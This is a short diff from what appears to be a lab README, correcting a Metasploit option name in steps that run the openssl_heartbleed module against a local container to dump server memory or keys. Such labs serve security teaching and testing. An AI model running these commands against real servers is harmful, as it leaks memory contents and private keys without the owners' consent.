@@ -43,7 +43,7 @@ bundle install
 ./msfconsole
 use auxiliary/scanner/ssl/openssl_heartbleed
 set ACTION DUMP      # Just dump data. Use KEYS if you want to try dumping the keys
-set RHOST 172.17.0.2 # IP address from the network inspect command
+set RHOSTS 172.17.0.2 # IP address from the network inspect command
 set RPORT 443        # Change if you use a different port in the container
 run
 ```
